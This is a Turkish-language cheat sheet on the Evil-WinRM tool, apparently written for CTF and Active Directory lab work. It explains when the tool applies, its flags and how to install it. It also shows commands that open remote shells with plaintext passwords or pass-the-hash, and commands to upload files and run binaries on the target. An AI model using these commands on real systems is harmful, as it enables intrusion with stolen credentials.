🔍 Genelde Nerelerde Kullanılır?
Evil-WinRM genellikle şu durumlarda kullanılır:

Kullanıcı adı ve şifresi biliniyorsa (örneğin hash kırılmışsa)

Kerberoasting, AS-REP Roasting gibi saldırılarda geçerli kullanıcı bilgileri ele geçirildiyse

SMB üzerinden kullanıcıların paylaşımları tarandıktan sonra yazma/çalıştırma yetkisi tespit edildiyse

Yetkili kullanıcı (örneğin Administrator, svc_tgs vb.) bilgileri elde edilirse

📦 Özellikleri
Uzaktan komut çalıştırma

Dosya yükleme ve indirme

PowerShell script'leri çalıştırma

Proxy, sertifika vb. destekleme

Yüksek yetkili shell açma (Administrator gibi)


---
-i: IP adresi (Hedef sistem)

-u: Kullanıcı adı (Hedef sistemdeki kullanıcı)

-p: Şifre
---
Not:
- Evil-WinRM kullanabilmek için hedef sistemde WinRM servisi açık olmalı.
- Genelde 445 (SMB) ve 5985/5986 (WinRM) portlarının açık olması gerekir.
- Bu araç CTF'lerde, özellikle Active Directory zafiyetlerinde çok sık kullanılır.

```bash 
evil-winrm -i 10.129.47.116 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```
---
Temel Özellikleri
WinRM üzerinden PowerShell oturumları başlatma

Dosya upload/download işlemleri

Komut çalıştırma yeteneği

PowerShell modüllerini yükleme desteği

Resimdeki Komutun Açıklaması
bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.http
Bu komutun parametreleri:

-u support: Bağlantı için kullanıcı adı (support)

-p 'Ironside47pleasure40Watchful': Kullanıcının parolası

-i support.http: Hedef makinenin IP adresi veya hostname'i

Kurulum
Kali Linux'ta kurulum için:

bash
sudo apt install evil-winrm
Veya Ruby gem olarak:

bash
gem install evil-winrm
Temel Kullanım Örnekleri
Basit bağlantı:

bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'P@ssw0rd'
Hash kullanarak bağlantı (Pass-the-Hash):

bash
evil-winrm -i 192.168.1.100 -u Administrator -H [NTLM_HASH]
SSL ile bağlantı:

bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'P@ssw0rd' -S
İç Komutlar
Bağlantı sağlandıktan sonra kullanılabilecek bazı komutlar:

upload: Dosya yükleme

download: Dosya indirme

services: Servisleri listeleme

menu: Etkileşimli menüyü gösterir

invoke-binary: Yerel bir binary'i hedefte çalıştırır
